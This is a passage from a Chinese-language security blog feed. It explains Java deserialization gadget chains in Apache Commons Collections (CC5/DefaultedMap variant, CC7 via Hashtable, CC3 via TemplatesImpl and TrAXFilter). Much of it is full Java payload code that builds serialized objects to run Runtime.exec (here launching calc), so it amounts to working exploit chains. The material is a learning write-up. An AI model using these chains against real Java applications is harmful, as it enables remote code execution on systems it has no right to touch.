class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transforms);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.lazyMap(map,chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,TrAXFilter.class);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> BadAttributeValueExpException.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;data.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>此处的<code>LazyMap</code>可以用<code>DefaultedMap</code>所替代</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java workforse\\java_deserialization\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[] code2= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java workforse\\java_deserialization\\Test.class&quot;</span>));</span><br><span class="line">        Class&lt;TemplatesImpl&gt; clazz = TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// bytecodes的长度设置为2</span></span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code, code2&#125;);</span><br><span class="line">        field= clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        field= clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        field= clazz.getDeclaredField(<span class="string">&quot;_transletIndex&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        Transformer[] transforms = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transforms);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">DefaultedMap</span> <span class="variable">defaultedMap</span> <span class="operator">=</span> (DefaultedMap) DefaultedMap.decorate(map, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(defaultedMap, TrAXFilter.class);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;data.bin&quot;</span>);</span><br></pre></td></tr></table></figure><h5 id="cc7">CC7</h5><p>这条链是用<code>AbstractMap</code>抽象类的<code>equals</code>函数执行<code>DefaultedMap</code>类的<code>get</code>方法</p><p><img src="/post/4ffaad45/image-20240613163939854.png" alt="image-20240613163939854" style="zoom:33%;"></p><p>由于<code>AbstractMap</code>是抽象类，因此不能直接实例化，要寻找它的继承子类，并且没有<code>equals</code>函数，就会执行<code>Abstract</code>的<code>equals</code>方法，这里选择的是可序列化的<code>HashMap</code>类，因此问题变成了寻找<code>readObject</code>函数，该函数应该能执行<code>equals</code>方法</p><p>这里选择<code>HashTable</code>类，该类的<code>readObject</code>方法调用了<code>reconstitutionPut</code>方法，这里的<code>elements</code>是<code>HashTable</code>键值对的数量</p><p><img src="/post/4ffaad45/image-20240613164226953.png" alt="image-20240613164226953" style="zoom:50%;"></p><p><code>reconstitutionPut</code>方法中调用了<code>equals</code>函数，并且原理应该是先传进的键调用<code>equals</code>方法，以后传进的键作为参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此先传进的应是<code>HashMap</code>对象，后传进的是<code>DefaultedMap</code>对象，相当于调用<code>AbstractMap</code>的<code>equals</code>方法，以构造的<code>DefaultedMap</code>对象作为参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transforms = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">DefaultedMap</span> <span class="variable">defaultedMap</span> <span class="operator">=</span> (DefaultedMap) DefaultedMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(), chainedTransformer);</span><br><span class="line">map.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">defaultedMap.put(<span class="string">&quot;key2&quot;</span>, <span class="string">&quot;value2&quot;</span>);</span><br><span class="line">Hashtable&lt;Object, Object&gt; objectObjectHashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">objectObjectHashtable.put(map, <span class="number">1</span>);</span><br><span class="line">objectObjectHashtable.put(defaultedMap, <span class="number">2</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz3</span> <span class="operator">=</span> chainedTransformer.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> clazz3.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field1.set(chainedTransformer, transforms);</span><br><span class="line">serialize(objectObjectHashtable);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;CC2+CC4+CC5+CC7&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>CommonsCollections3</title>
    <link href="http://example.com/post/6b2bc129.html"/>
    <id>http://example.com/post/6b2bc129.html</id>
    <published>2024-06-11T11:57:37.000Z</published>
    <updated>2024-09-28T16:17:24.000Z</updated>
    
    <content type="html"><![CDATA[<h5 id="特点">特点</h5><p>更换命令执行方式，之前是<code>Runtime.getRuntime().exec("calc");</code>，但很多时候可能存在Runtime过滤的情况，因此将执行命令方式更换为类动态加载执行命令</p><span id="more"></span><h5 id="找链子">找链子</h5><p>在中提到动态加载过程：<code>loadClass-&gt;findClass（重写的方法）-&gt;defineClass(从字节码加载)</code></p><p>因此我们可以使用<code>defineClass</code>加载我们生成好的执行命令对象，<code>defineClass</code>只能是加载，加载后的<code>class</code>对象还需要进行<code>newinstance</code>实例化才能执行代码块</p><p>此处选择的是<code>TemplatesImpl</code>类，查看该类的<code>defineClass</code>方法，可以看到是<code>Class</code>类</p><blockquote><p><strong><code>public</code></strong>：希望方法对所有类都可见且可访问时，例如公共API 的方法。</p><p><strong><code>private</code></strong>：希望方法只在类内部使用时，例如辅助性方法，不希望暴露给其他类使用。</p><p><strong><code>protected</code></strong>：希望方法可以在同一个包内以及在子类中使用时，例如需要扩展和重写的方法。</p><p><strong>默认（包私有）</strong>：希望方法只在同一个包内使用，不希望暴露给其他包或子类时。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处的<code>b</code>应该传入构造的用于执行代码的对象的字节</p><p>首先创建该字节，构造一段执行代码的代码，然后编译，在<code>out</code>文件夹中找到对应的<code>class</code>文件，此处我生成的的是Hello.class文件，读取文件字节代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java workforse\\java_deserialization\\Hello.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">\\ Hello.java:</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此应该想办法将这个<code>code</code>传入到上面的<code>defineClass</code>，同时再想办法执行<code>newinstance</code>进行实例化才能执行静态代码块，而上面的<code>defineClass</code>是不允许外部调用的，查看其调用过程</p><p>在<code>TemplatesImpl</code>类的<code>defineTransletClasses</code>方法中实现了唯一的调用，此处有几个地方需要注意，首先是<code>_bytecodes</code>变量不能为<code>null</code>，并且可以看到传入的对象是<code>_bytecodes[i]</code>，因此<code>_bytecodes</code>实际上应该是一个二维数组，还有就是<code>_tfactory</code>也不能为空，否则无法执行到下面的语句</p><p><img src="/post/6b2bc129/image-20240612100218227.png" alt="image-20240612100218227" style="zoom: 33%;"></p><p>下面还有一个值得注意的地方，此处的_auxClasses只有在<code>classCount</code>大于<code>1</code>的时候才执行，而下面<code>if</code>语句中只有获取到加载的我们的类的父类和<code>ABSTRACT_TRANSLET</code>相等才不能进入<code>else</code>语句，因此此处可以使<code>classCount</code>数量大于<code>1</code></p><p><img src="/post/6b2bc129/image-20240612100510215.png" alt="image-20240612100510215" style="zoom:33%;"></p><p>最后假设我们能够顺利加载类，还应该对加载的类进行实例化才能执行我们的静态代码块，因此继续找调用<code>defineTransletClasses</code>方法并且进行实例化的函数，此处找到的是<code>getTransletInstance</code>方法，如下所示，该方法在调用<code>defineTransletClasses</code>之后对加载的类<code>_class</code>进行了实例化</p><p><img src="/post/6b2bc129/image-20240612100945462.png" alt="image-20240612100945462" style="zoom:33%;"></p><h5 id="代码构造">代码构造</h5><p>首先新建<code>TemplatesImpl</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br></pre></td></tr></table></figure><p>然后确定<code>_name</code>变量不能为空，<code>_class</code>变量不能为空，<code>_transletIndex</code>变量不能为-1，<code>_tfactory</code>变量不能为空，<code>_bytecodes</code>长度应该为2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> TemplatesImpl.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(templates, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java workforse\\java_deserialization\\Hello.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[] code2= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java workforse\\java_deserialization\\Test.class&quot;</span>));</span><br><span class="line">field = clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// bytecodes的长度设置为2</span></span><br><span class="line">field.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code, code2&#125;);</span><br><span class="line">field= clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">field= clazz.getDeclaredField(<span class="string">&quot;_transletIndex&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(templates, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>由于<code>getTransletInstance</code>是<code>private</code>，因此找到调用该方法的<code>public</code>方法<code>newTransformer</code></p><p><img src="/post/6b2bc129/image-20240612101351398.png" alt="image-20240612101351398" style="zoom:50%;"></p><p>调用构造的<code>TemplatesImpl</code>对象的<code>newTransformer</code>方法就可以执行我们的代码</p><p><img src="/post/6b2bc129/image-20240612101455864.png" alt="image-20240612101455864" style="zoom: 25%;"></p><p>为了实现反序列化执行代码，可以直接使用前两篇中的<code>InvokerTransformer</code>的<code>transformer</code>漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java workforse\\java_deserialization\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[] code2= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java workforse\\java_deserialization\\Test.class&quot;</span>));</span><br><span class="line">        field = clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// bytecodes的长度设置为2</span></span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code, code2&#125;);</span><br><span class="line">        field= clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        field= clazz.getDeclaredField(<span class="string">&quot;_transletIndex&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map tmplazymap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tiedMapEntryClass</span> <span class="operator">=</span> TiedMapEntry.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tiedMapEntryClassDeclaredField</span> <span class="operator">=</span> tiedMapEntryClass.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        tiedMapEntryClassDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tiedMapEntryClassDeclaredField.set(tiedMapEntry,tmplazymap);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;data.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>除了使用<code>InvokerTransformer</code>的<code>transform</code>方法漏洞，此处还能调用<code>InstantiateTransformer</code>方法，原理是实现调用构造的<code>TemplatesImpl</code>对象的<code>newTransformer</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that performs no validation.</span></span><br><span class="line"><span class="comment"> * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> paramTypes  一个 Class[] 数组，表示构造函数参数的类型。这些类型不被克隆（即不创建参数类型的副本，而是直接引用传递进来的数组）。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args  一个 Object[] 数组，表示构造函数的实际参数。这些参数也不被克隆（即不创建参数的副本，而是直接引用传递进来的数组）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法的<code>transform</code>方法实现了构造<code>input</code>的构造函数，并以输入的<code>Class</code>数组作为传输传递</p><p><img src="/post/6b2bc129/image-20240612102359835.png" alt="image-20240612102359835" style="zoom: 33%;"></p><p>这里使用的是<code>TrAXFilter</code>类，就相当于<code>TrAXFilter</code>将要接受<code>iParamTypes</code>类型的<code>class</code>的参数进行实例化，因为<code>TrAXFilter</code>的初始化函数中实现了调用输入参数的<code>newTransformer</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此上面的<code>iParamTypes</code>应该是<code>templates</code>的<code>class</code>类型，<code>iArgs</code>就是<code>templates</code></p><p><code>InstantiateTransformer</code>类的构造方法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure><p>最后将<code>InstantiateTransformer</code>类放入<code>transformerChain</code>中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 